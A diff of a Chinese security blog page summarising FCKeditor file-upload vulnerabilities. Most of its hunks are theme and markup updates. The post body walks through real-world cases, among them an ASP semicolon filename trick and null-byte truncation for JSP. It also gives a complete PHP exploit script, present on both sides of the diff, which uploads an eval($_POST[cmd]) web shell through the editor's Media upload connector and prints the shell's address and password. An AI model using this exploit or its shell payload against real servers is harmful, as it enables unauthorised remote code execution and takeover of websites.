@@ -32,13 +32,37 @@
 
 
 
-  <link href="//fonts.useso.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
 
 
 
 <link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
 
-<link href="/css/main.css?v=5.0.0" rel="stylesheet" type="text/css" />
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
   <meta name="keywords" content="fckeditor,插件," />
@@ -52,7 +76,7 @@
 
 
 
-  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.0" />
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
 
 
 
@@ -71,7 +95,7 @@
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/f3.jpg">
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/f4.jpg">
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/f5.jpg">
-<meta property="og:updated_time" content="2016-04-27T05:41:38.679Z">
+<meta property="og:updated_time" content="2016-04-27T05:52:59.175Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="FCKeditor上传漏洞总结">
 <meta name="twitter:description" content="0x01 FCKeditor简介FCKeditor是一个专门使用在网页上属于开放源代码的所见即所得文字编辑器。它志于轻量化，不需要太复杂的安装步骤即可使用。它可和PHP、 JavaScript、ASP、ASP.NET、ColdFusion、Java、以及ABAP等不同的编程语言相结合。“FCKeditor”名称中的 “FCK” 是这个编辑器的作者的名字Frederico Caldeira Knab">
@@ -82,7 +106,7 @@
   var NexT = window.NexT || {};
   var CONFIG = {
     scheme: 'Pisces',
-    sidebar: '[object Object]',
+    sidebar: {"position":"left","display":"post"},
     fancybox: true,
     motion: true,
     duoshuo: {
@@ -98,6 +122,10 @@
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
+
+
+
+
 
 
 
@@ -138,7 +166,7 @@
   
 
   
-    <ul id="menu" class="menu ">
+    <ul id="menu" class="menu">
       
         
         <li class="menu-item menu-item-home">
@@ -157,6 +185,16 @@
               <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
             
             分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-user fa-fw"></i> <br />
+            
+            关于
           </a>
         </li>
       
@@ -180,19 +218,7 @@
           </a>
         </li>
       
-        
-        <li class="menu-item menu-item-about">
-          <a href="/about" rel="section">
-            
-              <i class="menu-item-icon fa fa-user fa-fw"></i> <br />
-            
-            关于
-          </a>
-        </li>
-      
 
-      
-      
       
     </ul>
   
@@ -292,6 +318,7 @@
                <span class="leancloud-visitors-count"></span>
               </span>
           
+
         </div>
       </header>
     
@@ -325,10 +352,63 @@
 <p>2.2.5.x以后是白名单验证，仅能寄希望于wooyun里爆的那个&lt;2.6.4的任意文件上传，成功率有限。</p>
 <p>3.2.6.4以上的php版，据我所知没戏，求高人指点！我粗略的看了一下它的验证逻辑，表示没戏，windows里的敏感字符全给过滤了。</p>
 <h2 id="0x05_实战案例">0x05 实战案例</h2><h3 id="【aspx+2-6-4】">【aspx+2.6.4】</h3><p>1.上传地址：<a href="http://***/FCKeditor/_samples/default.html" target="_blank" rel="external">http://***/FCKeditor/_samples/default.html</a><br>2.上传shell.asp;.jpg变shell_asp;.jpg，然后继续上传同名文件可变为shell.asp;(1).jpg<br>3.shell地址：<a href="http://***/userfiles/shell.asp;(1).jpg" target="_blank" rel="external">http://***/userfiles/shell.asp;(1).jpg</a><br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/f2.jpg" alt=""></p>
-<h3 id="【PHP+2-4-3】">【PHP+2.4.3】</h3><p>1.Linux服务器，利用media未设置导致任意文件上传，测试POC为：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">print_r(<span class="string">'</span><br><span class="line">      +--------------------------------------------------------------+</span><br><span class="line">                  NS-ASG Getshell  Exploit</span><br><span class="line">      +--------------------------------------------------------------+</span><br><span class="line">'</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$argc</span> &lt; <span class="number">2</span>) &#123;</span><br><span class="line">      print_r(<span class="string">'</span><br><span class="line">      +--------------------------------------------------------------+</span><br><span class="line">                  Example:</span><br><span class="line">                  php '</span>.<span class="variable">$argv</span>[<span class="number">0</span>].<span class="string">' localhost</span><br><span class="line">      +--------------------------------------------------------------+</span><br><span class="line">      '</span>);</span><br><span class="line">      <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$host</span> = <span class="variable">$argv</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="string">'index.php'</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">"/admin/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media"</span>;</span><br><span class="line"><span class="variable">$url</span> = <span class="string">'https://'</span>.<span class="variable">$host</span>.<span class="variable">$path</span>;</span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="string">"$file"</span>,<span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'can not write'</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">"&lt;?php phpinfo();eval(\$_POST[cmd]);?&gt;"</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">'NewFile'</span>=&gt;<span class="string">'@'</span>. dirname(<span class="keyword">__FILE__</span>).<span class="string">"/$file"</span>);</span><br><span class="line">	<span class="variable">$curl</span> = curl_init(); </span><br><span class="line">	curl_setopt ( <span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span> ); <span class="comment">// </span></span><br><span class="line">	curl_setopt ( <span class="variable">$curl</span>, CURLOPT_SSL_VERIFYPEER, <span class="number">0</span> ); </span><br><span class="line">	curl_setopt ( <span class="variable">$curl</span>, CURLOPT_SSL_VERIFYHOST, <span class="number">0</span> ); </span><br><span class="line">	curl_setopt ( <span class="variable">$curl</span>, CURLOPT_USERAGENT, <span class="string">"Mozilla/4.0"</span> ); </span><br><span class="line">	@curl_setopt ( <span class="variable">$curl</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span> ); </span><br><span class="line">	curl_setopt ( <span class="variable">$curl</span>, CURLOPT_AUTOREFERER, <span class="number">1</span> ); </span><br><span class="line">	curl_setopt ( <span class="variable">$curl</span>, CURLOPT_POST, <span class="number">1</span> ); </span><br><span class="line">	curl_setopt ( <span class="variable">$curl</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span> ); </span><br><span class="line">	</span><br><span class="line">	curl_setopt ( <span class="variable">$curl</span>, CURLOPT_TIMEOUT, <span class="number">120</span> ); </span><br><span class="line">	curl_setopt ( <span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span> ); </span><br><span class="line">	curl_setopt ( <span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span> );</span><br><span class="line">	<span class="variable">$tmpInfo</span> = curl_exec ( <span class="variable">$curl</span> ); </span><br><span class="line">	<span class="keyword">if</span> (curl_errno ( <span class="variable">$curl</span> )) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'Errno'</span> . curl_error ( <span class="variable">$curl</span> );</span><br><span class="line">	&#125;</span><br><span class="line">	curl_close ( <span class="variable">$curl</span> );</span><br><span class="line">    <span class="comment">//echo $tmpInfo;	</span></span><br><span class="line">    preg_match(<span class="string">'/201,\"(.*)\",\"/iU'</span>,<span class="variable">$tmpInfo</span>,<span class="variable">$matchs</span>);</span><br><span class="line">	<span class="variable">$url</span> = <span class="string">'https://'</span>.<span class="variable">$host</span>.<span class="variable">$matchs</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'Shell: '</span>.<span class="variable">$url</span>.<span class="string">'   password: cmd'</span>;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure><br>2.利用方式：php.exe 1.php 202.ip.ip.ip<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/f3.jpg" alt=""></p>
+<h3 id="【PHP+2-4-3】">【PHP+2.4.3】</h3><p>1.Linux服务器，利用media未设置导致任意文件上传，测试POC为：</p>
+<pre><code>&lt;?php
+print_r(<span class="string">'
+      +--------------------------------------------------------------+
+                  NS-ASG Getshell  Exploit
+      +--------------------------------------------------------------+
+'</span>);
+<span class="keyword">if</span> (<span class="variable">$argc</span> &lt; <span class="number">2</span>) {
+      print_r(<span class="string">'
+      +--------------------------------------------------------------+
+                  Example:
+                  php '</span>.<span class="variable">$argv</span>[<span class="number">0</span>].<span class="string">' localhost
+      +--------------------------------------------------------------+
+      '</span>);
+      exit;
+}
+<span class="variable">$host</span> = <span class="variable">$argv</span>[<span class="number">1</span>];
+<span class="variable">$file</span> = <span class="string">'index.php'</span>;
+<span class="variable">$path</span> = <span class="string">"/admin/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media"</span>;
+<span class="variable">$url</span> = <span class="string">'https://'</span>.<span class="variable">$host</span>.<span class="variable">$path</span>;
+<span class="variable">$fp</span> = fopen(<span class="string">"$file"</span>,<span class="string">"w"</span>) or die(<span class="string">'can not write'</span>);
+fwrite(<span class="variable">$fp</span>,<span class="string">"&lt;?php phpinfo();eval(\$_POST[cmd]);?&gt;"</span>);
+fclose(<span class="variable">$fp</span>);
+<span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">'NewFile'</span>=&gt;<span class="string">'@'</span>. dirname(__FILE_<span class="number">_</span>).<span class="string">"/$file"</span>);
+    <span class="variable">$curl</span> = curl_init(); 
+    curl_setopt ( <span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span> ); // 
+    curl_setopt ( <span class="variable">$curl</span>, CURLOPT_SSL_VERIFYPEER, <span class="number">0</span> ); 
+    curl_setopt ( <span class="variable">$curl</span>, CURLOPT_SSL_VERIFYHOST, <span class="number">0</span> ); 
+    curl_setopt ( <span class="variable">$curl</span>, CURLOPT_USERAGENT, <span class="string">"Mozilla/4.0"</span> ); 
+    @curl_setopt ( <span class="variable">$curl</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span> ); 
+    curl_setopt ( <span class="variable">$curl</span>, CURLOPT_AUTOREFERER, <span class="number">1</span> ); 
+    curl_setopt ( <span class="variable">$curl</span>, CURLOPT_POST, <span class="number">1</span> ); 
+    curl_setopt ( <span class="variable">$curl</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span> ); 
+
+    curl_setopt ( <span class="variable">$curl</span>, CURLOPT_TIMEOUT, <span class="number">120</span> ); 
+    curl_setopt ( <span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span> ); 
+    curl_setopt ( <span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span> );
+    <span class="variable">$tmpInfo</span> = curl_exec ( <span class="variable">$curl</span> ); 
+    <span class="keyword">if</span> (curl_errno ( <span class="variable">$curl</span> )) {
+        echo <span class="string">'Errno'</span> . curl_error ( <span class="variable">$curl</span> );
+    }
+    curl_close ( <span class="variable">$curl</span> );
+    //echo <span class="variable">$tmpInfo</span>;    
+    preg_match(<span class="string">'/201,\"(.*)\",\"/iU'</span>,<span class="variable">$tmpInfo</span>,<span class="variable">$matchs</span>);
+    <span class="variable">$url</span> = <span class="string">'https://'</span>.<span class="variable">$host</span>.<span class="variable">$matchs</span>[<span class="number">1</span>];
+    print <span class="string">'Shell: '</span>.<span class="variable">$url</span>.<span class="string">'   password: cmd'</span>;
+?&gt;
+</code></pre><p>2.利用方式：php.exe 1.php 202.ip.ip.ip<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/f3.jpg" alt=""></p>
 <h3 id="【JSP+2-2】">【JSP+2.2】</h3><p>1.利用00截断上传，地址如下：<br><a href="http://***/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector" target="_blank" rel="external">http://***/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector</a><br>2.上传后抓包并添加00截断如下：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/f4.jpg" alt=""><br>3.shell地址：<a href="http://***/UserFiles/Image/x.jsp" target="_blank" rel="external">http://***/UserFiles/Image/x.jsp</a><br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/f5.jpg" alt=""></p>
 <p>本文由HackBraid整理总结，如需转载请注明出处。</p>
 
+      
+    </div>
+
+    <div>
+      
+        
       
     </div>
 
@@ -430,19 +510,23 @@
             </a>
           </div>
 
-          <div class="site-state-item site-state-categories">
-            <a href="/categories">
-              <span class="site-state-item-count">2</span>
-              <span class="site-state-item-name">分类</span>
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">分类</span>
               </a>
-          </div>
+            </div>
+          
 
-          <div class="site-state-item site-state-tags">
-            <a href="/tags">
-              <span class="site-state-item-count">9</span>
-              <span class="site-state-item-name">标签</span>
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-name">标签</span>
               </a>
-          </div>
+            </div>
+          
 
         </nav>
 
@@ -462,38 +546,41 @@
         
         
 
-        <div class="links-of-author motion-element">
+        
+        <div class="links-of-blogroll motion-element">
           
-            <p class="site-author-name">友情链接</p>
-            
-              <span class="links-of-author-item">
-                <a href="http://tnt1200.github.io/" target="_blank">Tnt1200</a>
-              </span>
-            
-              <span class="links-of-author-item">
-                <a href="http://www.iswin.org/" target="_blank">随风</a>
-              </span>
-            
-              <span class="links-of-author-item">
-                <a href="http://bksec.net/" target="_blank">my5t3ry</a>
-              </span>
-            
-              <span class="links-of-author-item">
-                <a href="http://mars.run/" target="_blank">Mars</a>
-              </span>
-            
-              <span class="links-of-author-item">
-                <a href="http://www.thinkings.org/" target="_blank">从容</a>
-              </span>
-            
-              <span class="links-of-author-item">
-                <a href="http://www.waitalone.cn/" target="_blank">独自等待</a>
-              </span>
-            
-              <span class="links-of-author-item">
-                <a href="http://www.hacksb.org/" target="_blank">断笔抚琴</a>
-              </span>
-            
+            <div class="links-of-blogroll-title">友情链接</div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://tnt1200.github.io/" target="_blank">Tnt1200</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.iswin.org/" target="_blank">随风</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://bksec.net/" target="_blank">my5t3ry</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://mars.run/" target="_blank">Mars</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.thinkings.org/" target="_blank">从容</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.waitalone.cn/" target="_blank">独自等待</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.hacksb.org/" target="_blank">断笔抚琴</a>
+                </li>
+              
+            </ul>
           
         </div>
 
@@ -501,9 +588,6 @@
 
       
         <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc-indicator-top post-toc-indicator">
-            <i class="fa fa-angle-double-up"></i>
-          </div>
           <div class="post-toc">
             
               
@@ -511,9 +595,6 @@
             
               <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01_FCKeditor简介"><span class="nav-number">1.</span> <span class="nav-text">0x01 FCKeditor简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02_判断版本"><span class="nav-number">2.</span> <span class="nav-text">0x02 判断版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03_上传地址"><span class="nav-number">3.</span> <span class="nav-text">0x03 上传地址</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常用的上传地址A"><span class="nav-number">3.1.</span> <span class="nav-text">常用的上传地址A</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用的上传地址B"><span class="nav-number">3.2.</span> <span class="nav-text">常用的上传地址B</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04_上传方法"><span class="nav-number">4.</span> <span class="nav-text">0x04 上传方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ASP版"><span class="nav-number">4.1.</span> <span class="nav-text">ASP版</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ASPX版"><span class="nav-number">4.2.</span> <span class="nav-text">ASPX版</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP版"><span class="nav-number">4.3.</span> <span class="nav-text">PHP版</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05_实战案例"><span class="nav-number">5.</span> <span class="nav-text">0x05 实战案例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#【aspx+2-6-4】"><span class="nav-number">5.1.</span> <span class="nav-text">【aspx+2.6.4】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#【PHP+2-4-3】"><span class="nav-number">5.2.</span> <span class="nav-text">【PHP+2.4.3】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#【JSP+2-2】"><span class="nav-number">5.3.</span> <span class="nav-text">【JSP+2.2】</span></a></li></ol></li></ol></div>
             
-          </div>
-          <div class="post-toc-indicator-bottom post-toc-indicator">
-            <i class="fa fa-angle-double-down"></i>
           </div>
         </section>
       
@@ -533,18 +614,19 @@
   &copy; 
   <span itemprop="copyrightYear">2016</span>
   <span class="with-love">
-    <i class="icon-next-heart fa fa-heart"></i>
+    <i class="fa fa-heart"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">Braid</span>
 </div>
 
 <div class="powered-by">
-  信息安全博客
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
 </div>
 
 <div class="theme-info">
-  <a class="theme-link" href="mailto:hackbraid@gmail.com">
-    hackbraid@gmail.com
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
   </a>
 </div>
 
@@ -553,7 +635,9 @@
       </div>
     </footer>
 
-    <div class="back-to-top"></div>
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
   </div>
 
   
@@ -561,6 +645,14 @@
 
   
 
+
+
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
 
 
   <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
@@ -579,189 +671,33 @@
   
 
 
-  <script type="text/javascript" src="/js/src/utils.js?v=5.0.0"></script>
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
 
-  <script type="text/javascript" src="/js/src/motion.js?v=5.0.0"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.0.0"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.0"></script>
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
 
 
 
   
   
-<script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.0"></script>
 
-<script type="text/javascript" id="sidebar.toc.highlight">
-  $(document).ready(function () {
-    var tocSelector = '.post-toc';
-    var $tocSelector = $(tocSelector);
-    var activeCurrentSelector = '.active-current';
 
-    $tocSelector
-      .on('activate.bs.scrollspy', function () {
-        var $currentActiveElement = $(tocSelector + ' .active').last();
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
 
-        removeCurrentActiveClass();
-        $currentActiveElement.addClass('active-current');
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
 
-        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
-      })
-      .on('clear.bs.scrollspy', function () {
-        removeCurrentActiveClass();
-      });
 
-    function removeCurrentActiveClass () {
-      $(tocSelector + ' ' + activeCurrentSelector)
-        .removeClass(activeCurrentSelector.substring(1));
-    }
 
-    function processTOC () {
-      getTOCMaxHeight();
-      toggleTOCOverflowIndicators();
-    }
-
-    function getTOCMaxHeight () {
-      var height = $('.sidebar').height() -
-                   $tocSelector.position().top -
-                   $('.post-toc-indicator-bottom').height();
-
-      $tocSelector.css('height', height);
-
-      return height;
-    }
-
-    function toggleTOCOverflowIndicators () {
-      tocOverflowIndicator(
-        '.post-toc-indicator-top',
-        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
-      );
-
-      tocOverflowIndicator(
-        '.post-toc-indicator-bottom',
-        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
-      )
-    }
-
-    $(document).on('sidebar.motion.complete', function () {
-      processTOC();
-    });
-
-    $('body').scrollspy({ target: tocSelector });
-    $(window).on('resize', function () {
-      if ( $('.sidebar').hasClass('sidebar-active') ) {
-        processTOC();
-      }
-    });
-
-    onScroll($tocSelector);
-
-    function onScroll (element) {
-      element.on('mousewheel DOMMouseScroll', function (event) {
-          var oe = event.originalEvent;
-          var delta = oe.wheelDelta || -oe.detail;
-
-          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
-          event.preventDefault();
-
-          toggleTOCOverflowIndicators();
-      });
-    }
-
-    function tocOverflowIndicator (indicator, action) {
-      var $indicator = $(indicator);
-      var opacity = action === 'show' ? 1 : 0;
-      $indicator.velocity ?
-        $indicator.velocity('stop').velocity({
-          opacity: opacity
-        }, { duration: 100 }) :
-        $indicator.stop().animate({
-          opacity: opacity
-        }, 100);
-    }
-
-  });
-</script>
-
-<script type="text/javascript" id="sidebar.nav">
-  $(document).ready(function () {
-    var html = $('html');
-    var TAB_ANIMATE_DURATION = 200;
-    var hasVelocity = $.isFunction(html.velocity);
-
-    $('.sidebar-nav li').on('click', function () {
-      var item = $(this);
-      var activeTabClassName = 'sidebar-nav-active';
-      var activePanelClassName = 'sidebar-panel-active';
-      if (item.hasClass(activeTabClassName)) {
-        return;
-      }
-
-      var currentTarget = $('.' + activePanelClassName);
-      var target = $('.' + item.data('target'));
-
-      hasVelocity ?
-        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
-          target
-            .velocity('stop')
-            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
-            .addClass(activePanelClassName);
-        }) :
-        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
-          currentTarget.hide();
-          target
-            .stop()
-            .css({'opacity': 0, 'display': 'block'})
-            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
-              currentTarget.removeClass(activePanelClassName);
-              target.addClass(activePanelClassName);
-            });
-        });
-
-      item.siblings().removeClass(activeTabClassName);
-      item.addClass(activeTabClassName);
-    });
-
-    $('.post-toc a').on('click', function (e) {
-      e.preventDefault();
-      var targetSelector = NexT.utils.escapeSelector(this.getAttribute('href'));
-      var offset = $(targetSelector).offset().top;
-      hasVelocity ?
-        html.velocity('stop').velocity('scroll', {
-          offset: offset  + 'px',
-          mobileHA: false
-        }) :
-        $('html, body').stop().animate({
-          scrollTop: offset
-        }, 500);
-    });
-
-    // Expand sidebar on post detail page by default, when post has a toc.
-    NexT.motion.middleWares.sidebar = function () {
-      var $tocContent = $('.post-toc-content');
-
-      if (CONFIG.sidebar === 'post') {
-        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
-          NexT.utils.displaySidebar();
-        }
-      }
-    };
-  });
-</script>
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/vendors/jquery-scrollintoview/jquery.scrollintoview.min.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
 
 
 
   
 
 
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.0"></script>
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
 
 
 
@@ -794,8 +730,8 @@
 
   
   
-
   
+
   
 
   
@@ -891,6 +827,7 @@
 
 
 
+  
 
 </body>
 </html>
